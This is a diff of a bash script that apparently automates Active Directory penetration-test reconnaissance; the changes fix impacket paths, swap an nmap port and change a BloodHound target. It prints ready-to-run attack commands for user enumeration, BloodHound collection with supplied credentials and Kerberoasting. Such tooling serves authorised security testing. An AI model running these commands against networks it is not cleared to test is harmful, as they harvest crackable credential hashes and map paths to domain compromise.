@@ -175,7 +175,7 @@ touch $scriptlocation/vars/ADIP.txt
 touch $scriptlocation/vars/ADHostname.txt
 
 echo "   Scanning Active Directory IP"
-nmap -Pn -p389,3389 -A -iL $scriptlocation/vars/IPscope.txt --open -oA $scriptlocation/nmap/ADserver
+nmap -Pn -p389,636 -A -iL $scriptlocation/vars/IPscope.txt --open -oA $scriptlocation/nmap/ADserver
 cat $scriptlocation/nmap/ADserver.gnmap | grep 'Up' | awk '{print $2}' > $scriptlocation/vars/ADIP.txt
 cat $scriptlocation/nmap/ADserver.nmap | grep 'NetBIOS_Computer_Name: ' | awk '{print $3}' > $scriptlocation/vars/ADHostname.txt
 cat $scriptlocation/nmap/ADserver.nmap | grep 'DNS_Domain_Name: ' | awk '{print $3}' > $scriptlocation/vars/ADdomain.txt
@@ -1195,7 +1195,7 @@ echo
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Get All Users: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "  $ProxyChains python3 /opt/opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
+echo "  $ProxyChains python3 /opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo -e "\e[96m ${bold}    [+] Enumerate SMB Share: ${normal}"
@@ -1205,7 +1205,7 @@ echo "   -----------------------------------------------------------------------
 echo
 echo -e "\e[96m ${bold}    [+] Get Bloodhound json files: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "  $ProxyChains bloodhound-python -d $ADdomain -u $ActiveUsername -p '$ActivePass' -gc $ADIP -c all"
+echo "  $ProxyChains bloodhound-python -d $ADdomain -u $ActiveUsername -p '$ActivePass' -gc $FQDN -c all"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo "   Powerview: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
@@ -1213,7 +1213,7 @@ echo "   Pywerview: https://github.com/the-useless-one/pywerview"
 echo
 echo -e "\e[96m ${bold}    [+] Kerberoasting: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "  $ProxyChains python3 /opt/opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
+echo "  $ProxyChains python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
 echo "   Powerview: Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName"
 echo "   Bloodhound: MATCH(u:User {hasspn:true}) RETURN u"
 echo "   Bloodhound: MATCH(u:User {hasspn:true}.(c:Computer).p=shortestPath(u)-[*1..]->(c)) RETURN p"
